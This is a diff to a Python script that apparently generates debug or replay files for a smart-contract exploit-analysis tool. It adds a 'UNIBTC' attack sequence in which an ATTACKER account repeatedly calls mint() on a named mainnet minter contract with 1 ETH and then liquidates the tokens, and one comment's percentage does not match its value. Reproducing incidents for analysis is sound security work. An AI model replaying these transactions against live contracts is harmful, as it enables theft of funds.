@@ -119,6 +119,8 @@ def generate_debug_file(target, data):
             contract = w3.eth.contract(address=i["target"], abi=abi)
             abi_encoded = contract.encodeABI(fn_name=i["name"], args=i["args"]).replace("0x", "")
             current["direct_data"] = abi_encoded
+        elif "direct_data" in i:
+            current["direct_data"] = i["direct_data"]
         current["input_type"] = "ABI" if ("ty" not in i or i["ty"] == "abi") else "Borrow"
         current["caller"] = i["caller"]
         current["contract"] = i["target"]
@@ -218,4 +220,25 @@ AES_DEFLATE = [
 ]
 
 
-generate_debug_file("bsc", AES_DEFLATE)
+BTC_MINTER = Web3.to_checksum_address("0x047d41f2544b7f63a8e991af2068a363d210d6da")
+
+UNIBTC = [
+    {
+        "ty": "abi",
+        "caller": ATTACKER,
+        "target": BTC_MINTER,
+        "direct_data": "1249c58b",
+        "value": int(1e18),
+        "liquidation_percent": 10,  # sell 100% of the tokens
+    }, 
+    {
+        "ty": "abi",
+        "caller": ATTACKER,
+        "target": BTC_MINTER,
+        "direct_data": "1249c58b",
+        "value": int(1e18),
+        "liquidation_percent": 10,  # sell 100% of the tokens
+    }
+]
+
+generate_debug_file("eth", UNIBTC)
